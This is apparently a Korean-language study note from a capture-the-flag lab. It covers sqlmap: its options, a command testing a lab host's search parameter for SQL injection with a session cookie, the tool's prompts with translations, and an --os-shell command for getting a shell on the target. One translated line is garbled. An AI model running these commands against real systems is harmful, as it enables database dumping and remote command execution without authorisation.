sqlmap
#
`options`
```
--batch             사용자 입력을 요청하지 않음, 기본 동작 사용
--dump              DBMS 데이터베이스 테이블 항목 덤프
-a, --all           Retrieve everything
--forms             페이지의 <form> 요소에서 매개변수를 자동으로 선택
```
#
`URL과 쿠키로 취약점 찾기`

```
sqlmap -u 'http://10.129.240.57/dashboard.php?search=<any query>' --cookie="PHPSESSID=v9rdjfcg7hj8cmmauhnf1vj5pv"
```
찾으면서 뭐 많이 물어봄
```
got a 302 redirect to 'http://10.129.240.57:80/index.php'. Do you want to follow? [Y/n] y
302에서 'http://10.http.240.57:80/index.http'로 리디렉션되었습니다.

it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? 
최소 하나의 다른 (잠재적) 기법이 발견되지 않은 경우 기본 유니언 테스트만 수행할 것을 권장합니다. 요청 수를 줄이시겠습니까?

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'?
NULL 값으로 주입을 이용할 수 없습니다. '--union-char' 옵션에 대해 임의의 정수 값을 사용하시겠습니까?
```

![image](https://user-images.githubusercontent.com/61821641/150571358-e8e72825-ceac-47b2-9aca-9a681d5f070f.png)
#
`--os-shell flag 추가`

```
sqlmap --os-shell -u 'http://10.129.240.57/dashboard.php?search=<any query>' --cookie="PHPSESSID=v9rdjfcg7hj8cmmauhnf1vj5pv" 
```


